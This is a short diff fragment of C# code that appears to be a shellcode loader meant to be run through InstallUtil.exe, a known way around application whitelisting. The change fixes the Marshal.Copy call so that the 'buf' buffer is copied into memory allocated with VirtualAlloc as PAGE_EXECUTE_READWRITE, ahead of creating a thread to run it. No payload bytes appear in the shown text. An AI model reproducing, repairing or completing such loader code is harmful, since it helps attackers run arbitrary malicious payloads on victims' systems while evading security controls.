@@ -59,7 +59,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToCo
 	 
 				UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,
 									MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-				Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), buf.Length);
+				Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
 				IntPtr hThread = IntPtr.Zero;
 				UInt32 threadId = 0;
 
